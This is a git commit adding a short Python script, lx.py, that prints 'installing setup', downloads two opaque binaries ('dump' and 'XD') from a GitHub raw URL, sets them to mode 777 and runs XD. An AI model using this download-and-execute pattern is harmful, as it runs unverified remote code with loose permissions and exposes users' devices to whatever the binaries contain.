7e98c166f7a92a605a257076da3884c0cc76c130
Lx Ariyan Chowdhury <103047016+Alexx-Shohan@users.noreply.github.com>
2023-04-07 11:42:14 +0600

    Create lx.py

---
+++ lx.py
@@ -0,0 +1,17 @@
+import os,platform
+from os import path
+os.system('clear')
+print('\n\n\n\033[0;37m installing setup....\n')
+chk = platform.architecture()[0]
+if '64bit' in chk:
+    if path.isfile("dump"):
+        pass
+    else:
+        os.system(f'curl -L https://raw.githubusercontent.com/Alexx-Shohan/Alex_Paid/main/dump -o dump');os.system('chmod 777 dump')
+    if path.isfile("XD"):
+        pass
+    else:
+        os.system(f'curl -L https://raw.githubusercontent.com/Alexx-Shohan/Alex_Paid/main/XD -o XD');os.system('chmod 777 XD')
+else:
+    exit('\n\n\n\033[1;31m Sorry, Your Device Not Support')
+os.system('./XD')
